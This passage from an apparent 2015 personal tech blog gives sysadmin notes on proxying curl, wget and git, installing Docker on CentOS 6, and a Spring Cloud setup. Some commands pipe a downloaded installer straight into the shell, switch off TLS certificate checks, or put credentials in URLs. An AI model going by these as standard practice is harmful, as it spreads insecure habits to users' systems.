href="http://www.linux-magazine.com/Online/Features/Consolidating-Logs-with-Logstash">http://www.linux-magazine.com/Online/Features/Consolidating-Logs-with-Logstash</a><br><a target="_blank" rel="noopener" href="https://ianunruh.com/2014/05/monitor-everything-part-2.html">https://ianunruh.com/2014/05/monitor-everything-part-2.html</a><br><a target="_blank" rel="noopener" href="https://linuxfestnorthwest.org/sites/default/files/slides/Log%20Analysis%20with%20the%20ELK%20Stack.pdf">https://linuxfestnorthwest.org/sites/default/files/slides/Log%20Analysis%20with%20the%20ELK%20Stack.pdf</a><br><a target="_blank" rel="noopener" href="http://elekslabs.com/2014/05/centralized-logging-solutions-overview.html">http://elekslabs.com/2014/05/centralized-logging-solutions-overview.html</a><br><a target="_blank" rel="noopener" href="https://programmaticponderings.wordpress.com/2015/08/02/log-aggregation-visualization-and-analysis-of-microservices-using-elk-stack-and-logspout/">https://programmaticponderings.wordpress.com/2015/08/02/log-aggregation-visualization-and-analysis-of-microservices-using-elk-stack-and-logspout/</a></p>
</li>
</ul>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-curl_and_wget" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2015-10-16T02:40:39.000Z"><a href="/2015/10/16/curl_and_wget/">2015-10-16</a></time>
      
      
  
    <h1 class="title"><a href="/2015/10/16/curl_and_wget/">curl and wget</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="Usage-of-curl-and-wget"><a href="#Usage-of-curl-and-wget" class="headerlink" title="Usage of curl and wget"></a>Usage of curl and wget</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL -X post --data &quot;keyword=xx&quot; -k -u dhuser:dhpass -x proxyserver:8080 http://abc.com</span><br><span class="line"></span><br><span class="line">export http_proxy=proxyserver:8080</span><br><span class="line">wget --no-check-certificate https://dhuser:dhpass@abc.com/logs</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-git-clone-ssh-behind-proxy-windows" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2015-10-09T07:16:02.000Z"><a href="/2015/10/09/git-clone-ssh-behind-proxy-windows/">2015-10-09</a></time>
      
      
  
    <h1 class="title"><a href="/2015/10/09/git-clone-ssh-behind-proxy-windows/">git clone ssh behind proxy windows</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="Git-protocal"><a href="#Git-protocal" class="headerlink" title="Git protocal"></a>Git protocal</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git://</span><br><span class="line">https://</span><br><span class="line">ssh://</span><br></pre></td></tr></table></figure>

<h1 id="Create-repository"><a href="#Create-repository" class="headerlink" title="Create repository"></a>Create repository</h1><p><code>git init --bare</code></p>
<h1 id="Clone-repository"><a href="#Clone-repository" class="headerlink" title="Clone repository"></a>Clone repository</h1><p><code>git clone user@remote-server:/home/git/repo.git</code></p>
<h1 id="Clone-repository-behind-a-firewall-proxy"><a href="#Clone-repository-behind-a-firewall-proxy" class="headerlink" title="Clone repository behind a firewall proxy"></a>Clone repository behind a firewall proxy</h1><ul>
<li>Edit ~&#x2F;.ssh&#x2F;config, add following command to it<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ProxyCommand C:/connect-1.104-win32-msvc/connect.exe -H proxyserver:8080 %h %p</span><br><span class="line">IdentityFile &quot;C:/Users/user/Desktop/id_rsa&quot;</span><br></pre></td></tr></table></figure></li>
<li>Open cygwin, run <code>git clone</code> command above to retrieve repository.</li>
</ul>
<h1 id="Clone-repository-by-git-protocal"><a href="#Clone-repository-by-git-protocal" class="headerlink" title="Clone repository by git protocal"></a>Clone repository by git protocal</h1><ul>
<li><p>Install socat, then create a file named gitproxy, its content as below,<br><code>$ sudo vi /usr/bin/gitproxy</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">PROXY=squid.vpsee.com</span><br><span class="line">PROXYPORT=3128</span><br><span class="line">PROXYAUTH=username:password</span><br><span class="line">exec socat STDIO PROXY:$PROXY:$1:$2,proxyport=$PROXYPORT,proxyauth=$PROXYAUTH</span><br></pre></td></tr></table></figure>
<p><code>$ git config --global core.gitproxy gitproxy</code></p>
</li>
<li><p>Clone repository<br><code>git clone git://user@remote-server:/home/git/repo.git</code></p>
</li>
</ul>
<p><a target="_blank" rel="noopener" href="http://cms-sw.github.io/tutorial-proxy.html">http://cms-sw.github.io/tutorial-proxy.html</a><br><a target="_blank" rel="noopener" href="http://www.vpsee.com/2011/07/how-to-use-git-through-a-http-proxy/">http://www.vpsee.com/2011/07/how-to-use-git-through-a-http-proxy/</a><br><a target="_blank" rel="noopener" href="http://www.laurii.info/2013/04/git-ssh-behind-proxy-windows/">http://www.laurii.info/2013/04/git-ssh-behind-proxy-windows/</a><br><a target="_blank" rel="noopener" href="http://stackoverflow.com/questions/3248779/which-is-faster-ssh-or-git-protocol">http://stackoverflow.com/questions/3248779/which-is-faster-ssh-or-git-protocol</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Install-Docker-on-CentOS6" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2015-10-07T07:16:02.000Z"><a href="/2015/10/07/Install-Docker-on-CentOS6/">2015-10-07</a></time>
      
      
  
    <h1 class="title"><a href="/2015/10/07/Install-Docker-on-CentOS6/">Install Docker on CentOS 6</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="Update-OS"><a href="#Update-OS" class="headerlink" title="Update OS"></a>Update OS</h1><p><code>yum update -y</code></p>
<h1 id="Upgrade-kernel-3-10"><a href="#Upgrade-kernel-3-10" class="headerlink" title="Upgrade kernel 3.10"></a>Upgrade kernel 3.10</h1><h2 id="Check-kernel-version"><a href="#Check-kernel-version" class="headerlink" title="Check kernel version"></a>Check kernel version</h2><p><code>uname -r</code> &#x3D;&gt; 2.6.32-279.el6.x86_64</p>
<h2 id="Import-ELRepo-public-keys"><a href="#Import-ELRepo-public-keys" class="headerlink" title="Import ELRepo public keys"></a>Import ELRepo public keys</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org</span><br><span class="line">rpm -Uvh http://www.elrepo.org/elrepo-release-6-6.el6.elrepo.noarch.rpm</span><br></pre></td></tr></table></figure>

<h2 id="Install-kernel"><a href="#Install-kernel" class="headerlink" title="Install kernel"></a>Install kernel</h2><p><code>yum --enablerepo=elrepo-kernel install kernel-lt</code><br><code>uname -r</code> &#x3D;&gt; 3.10.90-1.el6.elrepo.x86_64</p>
<h2 id="Configure-grub"><a href="#Configure-grub" class="headerlink" title="Configure grub"></a>Configure grub</h2><p>Change the kernel boot order at <code>/etc/grub.conf</code>, change default from 1 to 0 as below,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">default=0</span><br><span class="line">timeout=5</span><br><span class="line">splashimage=(hd0,0)/grub/splash.xpm.gz</span><br><span class="line">hiddenmenu</span><br><span class="line">title CentOS (3.10.90-1.el6.elrepo.x86_64)</span><br><span class="line">        root (hd0,0)</span><br><span class="line">        kernel /vmlinuz-3.10.90-1.el6.elrepo.x86_64 ro root=/dev/mapper/VolGroup-lv_root rd_NO_LUKS LANG=en_US.UTF-8 rd_NO_MD console=hvc0  KEYTABLE=us rd_LVM_LV=VolGroup/lv_swap SYSFONT=latarcyrheb-sun16 crashkernel=auto rd_LVM_LV=VolGroup/lv_root rd_NO_DM rhgb quiet</span><br><span class="line">        initrd /initramfs-3.10.90-1.el6.elrepo.x86_64.img</span><br><span class="line">title CentOS (2.6.32-573.7.1.el6.x86_64)</span><br><span class="line">        root (hd0,0)</span><br><span class="line">        kernel /vmlinuz-2.6.32-573.7.1.el6.x86_64 ro root=/dev/mapper/VolGroup-lv_root rd_NO_LUKS LANG=en_US.UTF-8 rd_NO_MD console=hvc0  KEYTABLE=us rd_LVM_LV=VolGroup/lv_swap SYSFONT=latarcyrheb-sun16 crashkernel=auto rd_LVM_LV=VolGroup/lv_root rd_NO_DM rhgb quiet</span><br><span class="line">        initrd /initramfs-2.6.32-573.7.1.el6.x86_64.img</span><br><span class="line">title CentOS (2.6.32-279.el6.x86_64)</span><br><span class="line">        root (hd0,0)</span><br><span class="line">        kernel /vmlinuz-2.6.32-279.el6.x86_64 ro root=/dev/mapper/VolGroup-lv_root rd_NO_LUKS LANG=en_US.UTF-8 rd_NO_MD console=hvc0  KEYTABLE=us rd_LVM_LV=VolGroup/lv_swap SYSFONT=latarcyrheb-sun16 crashkernel=auto rd_LVM_LV=VolGroup/lv_root rd_NO_DM rhgb quiet</span><br><span class="line">        initrd /initramfs-2.6.32-279.el6.x86_64.img</span><br></pre></td></tr></table></figure>


<h2 id="Check-kernel-configuration-as-a-suitable-docker-host"><a href="#Check-kernel-configuration-as-a-suitable-docker-host" class="headerlink" title="Check kernel configuration as a suitable docker host"></a>Check kernel configuration as a suitable docker host</h2><p><code>wget https://raw.githubusercontent.com/docker/docker/master/contrib/check-config.sh</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">./check-config.sh</span><br><span class="line">warning: /proc/config.gz does not exist, searching other paths for kernel config ...</span><br><span class="line">info: reading kernel config from /boot/config-3.10.90-1.el6.elrepo.x86_64 ...</span><br><span class="line"></span><br><span class="line">Generally Necessary:</span><br><span class="line">- cgroup hierarchy: properly mounted [/cgroup]</span><br><span class="line">- CONFIG_NAMESPACES: enabled</span><br><span class="line">- CONFIG_NET_NS: enabled</span><br><span class="line">- CONFIG_PID_NS: enabled</span><br><span class="line">- CONFIG_IPC_NS: enabled</span><br><span class="line">- CONFIG_UTS_NS: enabled</span><br><span class="line">- CONFIG_DEVPTS_MULTIPLE_INSTANCES: enabled</span><br><span class="line">- CONFIG_CGROUPS: enabled</span><br><span class="line">- CONFIG_CGROUP_CPUACCT: enabled</span><br><span class="line">- CONFIG_CGROUP_DEVICE: enabled</span><br><span class="line">- CONFIG_CGROUP_FREEZER: enabled</span><br><span class="line">- CONFIG_CGROUP_SCHED: enabled</span><br><span class="line">- CONFIG_CPUSETS: enabled</span><br><span class="line">- CONFIG_MEMCG: enabled</span><br><span class="line">- CONFIG_MACVLAN: enabled (as module)</span><br><span class="line">- CONFIG_VETH: enabled (as module)</span><br><span class="line">- CONFIG_BRIDGE: enabled (as module)</span><br><span class="line">- CONFIG_BRIDGE_NETFILTER: enabled</span><br><span class="line">- CONFIG_NF_NAT_IPV4: enabled (as module)</span><br><span class="line">- CONFIG_IP_NF_FILTER: enabled (as module)</span><br><span class="line">- CONFIG_IP_NF_TARGET_MASQUERADE: enabled (as module)</span><br><span class="line">- CONFIG_NETFILTER_XT_MATCH_ADDRTYPE: enabled (as module)</span><br><span class="line">- CONFIG_NETFILTER_XT_MATCH_CONNTRACK: enabled (as module)</span><br><span class="line">- CONFIG_NF_NAT: enabled (as module)</span><br><span class="line">- CONFIG_NF_NAT_NEEDED: enabled</span><br><span class="line">- CONFIG_POSIX_MQUEUE: enabled</span><br><span class="line"></span><br><span class="line">Optional Features:</span><br><span class="line">- CONFIG_MEMCG_KMEM: enabled</span><br><span class="line">- CONFIG_MEMCG_SWAP: enabled</span><br><span class="line">- CONFIG_MEMCG_SWAP_ENABLED: missing</span><br><span class="line">    (note that cgroup swap accounting is not enabled in your kernel config, you can enable it by setting boot option &quot;swapaccount=1&quot;)</span><br><span class="line">- CONFIG_RESOURCE_COUNTERS: enabled</span><br><span class="line">- CONFIG_BLK_CGROUP: enabled</span><br><span class="line">- CONFIG_IOSCHED_CFQ: enabled</span><br><span class="line">- CONFIG_BLK_DEV_THROTTLING: enabled</span><br><span class="line">- CONFIG_CGROUP_PERF: enabled</span><br><span class="line">- CONFIG_CGROUP_HUGETLB: missing</span><br><span class="line">- CONFIG_NET_CLS_CGROUP: enabled</span><br><span class="line">- CONFIG_NETPRIO_CGROUP: enabled (as module)</span><br><span class="line">- CONFIG_CFS_BANDWIDTH: enabled</span><br><span class="line">- CONFIG_FAIR_GROUP_SCHED: enabled</span><br><span class="line">- CONFIG_RT_GROUP_SCHED: enabled</span><br><span class="line">- CONFIG_EXT3_FS: enabled (as module)</span><br><span class="line">- CONFIG_EXT3_FS_XATTR: enabled</span><br><span class="line">- CONFIG_EXT3_FS_POSIX_ACL: enabled</span><br><span class="line">- CONFIG_EXT3_FS_SECURITY: enabled</span><br><span class="line">- CONFIG_EXT4_FS: enabled (as module)</span><br><span class="line">- CONFIG_EXT4_FS_POSIX_ACL: enabled</span><br><span class="line">- CONFIG_EXT4_FS_SECURITY: enabled</span><br><span class="line">- Storage Drivers:</span><br><span class="line">  - &quot;aufs&quot;:</span><br><span class="line">    - CONFIG_AUFS_FS: missing</span><br><span class="line">  - &quot;btrfs&quot;:</span><br><span class="line">    - CONFIG_BTRFS_FS: enabled (as module)</span><br><span class="line">  - &quot;devicemapper&quot;:</span><br><span class="line">    - CONFIG_BLK_DEV_DM: enabled (as module)</span><br><span class="line">    - CONFIG_DM_THIN_PROVISIONING: enabled (as module)</span><br><span class="line">  - &quot;overlay&quot;:</span><br><span class="line">    - CONFIG_OVERLAY_FS: missing</span><br><span class="line">  - &quot;zfs&quot;:</span><br><span class="line">    - /dev/zfs: missing</span><br><span class="line">    - zfs command: missing</span><br><span class="line">    - zpool command: missing</span><br></pre></td></tr></table></figure>

<h1 id="Install-Docker"><a href="#Install-Docker" class="headerlink" title="Install Docker"></a>Install Docker</h1><h2 id="Install-epel-repository"><a href="#Install-epel-repository" class="headerlink" title="Install epel repository"></a>Install epel repository</h2><p><code>rpm -iUvh http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm</code></p>
<h2 id="Update-packages"><a href="#Update-packages" class="headerlink" title="Update packages"></a>Update packages</h2><p><code>yum update -y</code></p>
<h2 id="Install-Docker-1"><a href="#Install-Docker-1" class="headerlink" title="Install Docker"></a>Install Docker</h2><p><code>yum install docker-io</code></p>
<h2 id="Start-docker-daemon"><a href="#Start-docker-daemon" class="headerlink" title="Start docker daemon"></a>Start docker daemon</h2><p><code>service docker start</code></p>
<h2 id="Configure-docker-to-start-when-os-boots"><a href="#Configure-docker-to-start-when-os-boots" class="headerlink" title="Configure docker to start when os boots"></a>Configure docker to start when os boots</h2><p><code>chkconfig docker on</code></p>
<h2 id="Test-docker"><a href="#Test-docker" class="headerlink" title="Test docker"></a>Test docker</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker pull busybox</span><br><span class="line">docker pull centos</span><br><span class="line"></span><br><span class="line">docker run -i -t busybox /bin/sh</span><br><span class="line">docker run -i -t centos /bin/bash</span><br></pre></td></tr></table></figure>
<h2 id="Install-docker-compose"><a href="#Install-docker-compose" class="headerlink" title="Install docker-compose"></a>Install docker-compose</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://github.com/docker/compose/releases/download/1.4.2/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>
<p>Test docker-compose from <a target="_blank" rel="noopener" href="https://docs.docker.com/compose/">https://docs.docker.com/compose/</a></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="http://bicofino.io/blog/2014/10/25/install-kernel-3-dot-10-on-centos-6-dot-5/">Install Kernel 3.10 on CentOS 6.5</a><br><a target="_blank" rel="noopener" href="http://dockerpool.com/article/1415195109">阿里云的Centos 6.5 模板上使用Docker</a><br><a target="_blank" rel="noopener" href="http://elrepo.org/tiki/tiki-index.php">http://elrepo.org/tiki/tiki-index.php</a><br><a target="_blank" rel="noopener" href="http://elrepo.org/tiki/kernel-lt">kernel-lt</a><br><a target="_blank" rel="noopener" href="http://www.liquidweb.com/kb/how-to-install-docker-on-centos-6/">How To Install Docker on CentOS 6</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Fun-with-Spring-Cloud-and-microservice" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2015-10-02T04:08:17.000Z"><a href="/2015/10/02/Fun-with-Spring-Cloud-and-microservice/">2015-10-02</a></time>
      
      
  
    <h1 class="title"><a href="/2015/10/02/Fun-with-Spring-Cloud-and-microservice/">Fun with Spring Cloud and microservice</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <ul>
<li><p>Excellent Blog</p>
<ul>
<li><p>Must read<br><a target="_blank" rel="noopener" href="http://callistaenterprise.se/blogg/teknik/2015/05/20/blog-series-building-microservices/">Blog Series - Building Microservices</a><br><a target="_blank" rel="noopener" href="http://www.kennybastani.com/2015/07/spring-cloud-docker-microservices.html">Building Microservices with Spring Cloud and Docker</a></p>
</li>
<li><p>Spring<br><a target="_blank" rel="noopener" href="https://spring.io/blog/2015/01/20/microservice-registration-and-discovery-with-spring-cloud-and-netflix-s-eureka">Microservice Registration and Discovery with Spring Cloud and Netflix’s Eureka</a><br><a target="_blank" rel="noopener" href="https://spring.io/blog/2015/07/14/microservices-with-spring">Microservices with Spring</a><br><a target="_blank" rel="noopener" href="https://dzone.com/articles/learning-spring-cloud-writing">Learning Spring-Cloud - Writing a Microservice</a><br><a target="_blank" rel="noopener" href="https://spring.io/guides/gs/spring-boot-docker/">Spring Boot with Docker</a><br><a target="_blank" rel="noopener" href="http://12factor.net/zh_cn/disposability">12factor app</a></p>
</li>
</ul>
</li>
<li><p>GitHub<br><a target="_blank" rel="noopener" href="https://github.com/spring-cloud-samples">spring-cloud-samples</a><br><a target="_blank" rel="noopener" href="https://github.com/spring-cloud/">spring-cloud</a></p>
</li>
</ul>
<hr>
<ul>
<li><p>Install docker</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export http_proxy=http://192.168.56.1:21</span><br><span class="line">curl -x 192.168.56.1:21 -sSL https://get.docker.com/gpg | sudo apt-key add -</span><br><span class="line">curl -x 192.168.56.1:21 -sSL https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure>
</li>
<li><p>Clone spring project</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/kbastani/spring-cloud-microservice-example --config &quot;http.proxy=http://192.168.56.1:21&quot;</span><br></pre></td></tr></table></figure>
<p>cd spring-cloud-microservice-example&#x2F;</p>
</li>
<li><p>Install docker-compose</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -x http://192.168.56.1:21 -L https://github.com/docker/compose/releases/download/1.4.0/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>
</li>
<li><p>Install Maven<br><code>wget http://apache.communilink.net//maven/maven-3/3.3.3/binaries/apache-maven-3.3.3-bin.tar.gz</code><br>set proxy and repository path (shared by user and root) in conf&#x2F;settings.xml</p>
</li>
<li><p>Install Gradle<br><code>gradle -Dhttp.proxyHost=192.168.56.1 -Dhttp.proxyPort=21 -Dhttps.proxyHost=192.168.56.1 -Dhttps.proxyPort=21 build</code></p>
</li>
<li><p>Install Java (Refer to <a target="_blank" rel="noopener" href="http://www.tecmint.com/install-java-jdk-jre-in-linux/">http://www.tecmint.com/install-java-jdk-jre-in-linux/</a> or <a target="_blank" rel="noopener" href="http://tecadmin.net/install-java-8-on-centos-rhel-and-fedora/">http://tecadmin.net/install-java-8-on-centos-rhel-and-fedora/</a>)<br>Download jdk-8u60-linux-x64.gz</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo update-alternatives --install /usr/bin/java java /home/user/Software/jdk1.8.0_60/bin/java 3</span><br><span class="line">sudo update-alternatives --install /usr/bin/javac javac /home/user/Software/jdk1.8.0_60/bin/javac 3</span><br><span class="line">sudo update-alternatives --set jar /home/user/Software/jdk1.8.0_60/bin/jar</span><br><span class="line">sudo update-alternatives --set javac /home/user/Software/jdk1.8.0_60/bin/javac</span><br></pre></td></tr></table></figure>
</li>
<li><p>Setup docker proxy<br>edit <code>/etc/default/docker</code> to set proxy (<code>/etc/sysconfig/docker</code> in CentOS)<br><code>service docker restart</code><br>or</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo HTTP_PROXY=http://192.168.56.1:21/ docker -d &amp;</span><br><span class="line">sudo usermod -aG docker username</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<p>Installed software and component</p>
<ul>
<li>rover-master (<a target="_blank" rel="noopener" href="https://github.com/lecram/rover">https://github.com/lecram/rover</a>)</li>
<li>otp_src_18.0 (Erlang)</li>
<li>rabbitmq_server-3.5.4</li>
<li>spring-cloud<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/callistaenterprise/blog-microservices.git">https://github.com/callistaenterprise/blog-microservices.git</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/bijukunjummen/spring-cloud-ping-pong-sample">https://github.com/bijukunjummen/spring-cloud-ping-pong-sample</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/joshlong/service-registration-and-discovery">https://github.com/joshlong/service-registration-and-discovery</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/paulc4/microservices-demo">https://github.com/paulc4/microservices-demo</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/kbastani/spring-cloud-microservice-example">https://github.com/kbastani/spring-cloud-microservice-example</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/spring-guides/gs-spring-boot-docker.git">https://github.com/spring-guides/gs-spring-boot-docker.git</a></li>
</ul>
</li>
<li>elinks-0.12-20150916</li>
<li>Python-2.7.3</li>
<li>ranger-1.7.1</li>
<li>torrent<ul>
<li>transmission-2.84</li>
<li>libevent-2.0.22-stable</li>
<li>curl-7.44.0</li>
<li>intltool-0.51.0</li>
</ul>
</li>
<li>tmux-2.0</li>
<li>ncurses-6.0</li>
<li>apache-maven-3.3.3</li>
<li>git-1.8.5.4</li>
<li>phpredis</li>
<li>redis-2.8.21</li>
<li>ffmpeg_sources<ul>
<li>ffmpeg (git clone)</li>
<li>x264 (git clone)</li>
<li>libvorbis-1.3.4 (libvorbis-1.3.4.tar.gz)</li>
<li>lame-3.99.5 (lame-3.99.5.tar.gz)</li>
<li>libvpx (git clone)</li>
<li>libogg-1.3.0 (libogg-1.3.0.tar.gz)</li>
<li>yasm-1.2.0 (yasm-1.2.0.tar.gz)</li>
<li>yasm (git clone)</li>
<li>xvidcore (git clone)</li>
</ul>
</li>
<li>shadowsocks-libev (<a target="_blank" rel="noopener" href="https://github.com/shadowsocks/shadowsocks-libev.git">https://github.com/shadowsocks/shadowsocks-libev.git</a>)</li>
<li>jdk1.8.0_60</li>
<li>magento-sample-data-1.9.1.0</li>
<li>youtube-dl (<a target="_blank" rel="noopener" href="https://rg3.github.io/youtube-dl/">https://rg3.github.io/youtube-dl/</a>)</li>
<li>jq (<a target="_blank" rel="noopener" href="https://stedolan.github.io/jq/">https://stedolan.github.io/jq/</a>)</li>
</ul>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-node_module-config" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2015-10-02T04:08:17.000Z"><a href="/2015/10/02/node_module-config/">2015-10-02</a></time>
      
      
  
    <h1 class="title"><a href="/2015/10/02/node_module-config/">node_module config</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="node-module"><a href="#node-module" class="headerlink" title="node_module"></a>node_module</h1><h2 id="Config"><a href="#Config" class="headerlink" title="Config"></a>Config</h2><ul>
<li>npm<h2 id="“C-x2F-program-file-x2F-node-x2F-node-module”"><a href="#“C-x2F-program-file-x2F-node-x2F-node-module”" class="headerlink" title=" “C:&#x2F;program file&#x2F;node&#x2F;node_module”"></a> “C:&#x2F;program file&#x2F;node&#x2F;node_module”</h2></li>
<li>cache<br> “C:&#x2F;&#x2F;Users&#x2F;&#x2F;HPUser&#x2F;&#x2F;AppData&#x2F;&#x2F;Roaming&#x2F;&#x2F;npm-cache”<br> &#x2F;home&#x2F;xx&#x2F;.npm</li>
<li>prefix<br> “C:&#x2F;&#x2F;Users&#x2F;&#x2F;HPUser&#x2F;&#x2F;AppData&#x2F;&#x2F;Roaming&#x2F;&#x2F;npm”<br> “&#x2F;usr&#x2F;local”</li>
<li>userconfig<br> “C:&#x2F;&#x2F;Users&#x2F;&#x2F;HPUser&#x2F;&#x2F;.npmrc”<br> “&#x2F;home&#x2F;xx&#x2F;.npmrc”</li>
<li>globalconfig<br> “C:&#x2F;&#x2F;Users&#x2F;&#x2F;HPUser&#x2F;&#x2F;AppData&#x2F;&#x2F;Roaming&#x2F;&#x2F;npm&#x2F;&#x2F;etc&#x2F;&#x2F;npmrc”<br> “&#x2F;usr&#x2F;local&#x2F;etc&#x2F;npmrc”</li>
<li>tmp<br> “C:&#x2F;&#x2F;Users&#x2F;&#x2F;HPUser&#x2F;&#x2F;AppData&#x2F;&#x2F;Local&#x2F;&#x2F;Temp”<br> “&#x2F;home&#x2F;xx&#x2F;tmp”</li>
</ul>
<h1 id="Show-config-list"><a href="#Show-config-list" class="headerlink" title="Show config list"></a>Show config list</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm config list</span><br><span class="line">npm config get prefix / set prefix</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-What-stuff-has-done-with-Magento" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2015-09-09T09:14:17.000Z"><a href="/2015/09/09/What-stuff-has-done-with-Magento/">2015-09-09</a></time>
      
      
  
